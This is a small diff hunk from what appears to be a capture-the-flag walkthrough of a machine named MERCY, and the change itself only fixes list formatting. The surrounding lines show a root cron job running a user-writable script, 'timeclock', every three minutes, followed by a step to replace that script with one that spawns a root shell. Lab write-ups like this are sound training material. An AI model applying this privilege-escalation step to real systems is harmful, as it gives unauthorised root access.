@@ -861,7 +861,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	- 2022/02/08 11:36:01: 
 		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock`
 	- 2022/02/08 11:39:01
-			`/bin/sh -c bash /home/fluffy/.private/secrets/timeclock `
+		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock `
 	- `timeclock` is executed by root cronjob every 3 minutes
 4. Replace `timeclock` w/ a script to create a root shell
 	```
